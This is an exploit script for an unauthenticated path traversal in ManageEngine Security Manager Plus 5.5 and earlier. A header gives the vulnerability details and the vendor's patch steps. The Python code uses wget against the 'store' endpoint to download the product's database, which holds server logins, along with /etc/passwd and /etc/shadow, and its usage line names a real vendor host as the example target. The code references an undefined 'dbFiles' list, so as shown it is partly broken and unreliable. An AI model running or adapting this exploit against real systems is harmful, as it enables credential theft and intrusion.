#+--------------------------------------------------------------------------------------------------------------------------------+
# Exploit Title     : Security Manager Plus <= 5.5 build 5505 Path Traversal (Win+Linux)
# Date              : 18-10-2012
# Author            : xistence (xistence<[AT]>0x90.nl)
# Software link     : http://www.manageengine.com/products/security-manager/81779457/ManageEngine_SecurityManager_Plus.exe (Win)
# Software link     : http://www.manageengine.com/products/security-manager/81779457/ManageEngine_SecurityManager_Plus.zip (Linux)
# Vendor site       : http://www.manageengine.com/
# Version           : 5.5 build 5505 and lower
# Tested on         : CentOS 5.x + Windows XP/2008
#
# Vulnerability     : The Path Traversal is possible on the "store" url, without any authentication. This allows us to download the complete
#             database and thus gather windows/linux logins which are used for patching the servers. It will also download the
#             passwd and shadow files as Security Manager Plus runs with root/SYSTEM privileges. Modify it to make it work on windows,
#             and grab SAM files or other files. NOTE: At least one patch must have been downloaded in Security Manager Plus already.
#
# Fix:
# 1. Go to SMP server system and stop SMP service.
# 2. Download the SMP_Vul_fix.zip file from : http://bonitas.zohocorp.com/4264259/scanfi/31May2012/SMP_Vul_fix.zip
# 3. Extract the downloaded file which contains four files : AdvPMServer.jar, AdvPMClient.jar, scanfi.jar and AdventNetPMUnixAgent.jar
# 3. Copy the extracted .jar files to <SMP-HOME>\lib directory (e.g., C:\AdventNet\SecurityManager\lib). [Overwrite the existing jar files and do not rename them]
# 4. Start the SMP service.
#+--------------------------------------------------------------------------------------------------------------------------------+
 
import os, sys
 
if (len(sys.argv) != 2):
    print ""
    print "[*] Security Manager Plus Path Traversal Exploit - xistence (xistence<[at]>0x90.nl) - 2012-05-29"
    print ""
    print "[*] Usage: secman-path.py <RHOST>"
    print "[*] I.e.:  ./secman-path.py www.manageengine.com"
    print "[*]"
    print "[*] RHOST = Remote Host which runs Security Manager Plus"
    print ""
    print ""
    exit(0)
 
rhost = sys.argv[1]
 
 
 
for blah in dbFiles:
    print "[*] Downloading file: " + blah
    os.system("wget -q http://%s:6262/store?f=../mysql/data/securitymanager/%s -O %s" % (rhost, blah, blah))
 
os.system("wget http://%s:6262/store?f=../../../../../etc/passwd -O passwd" % rhost)
os.system("wget http://%s:6262/store?f=../../../../../etc/shadow -O shadow" % rhost)



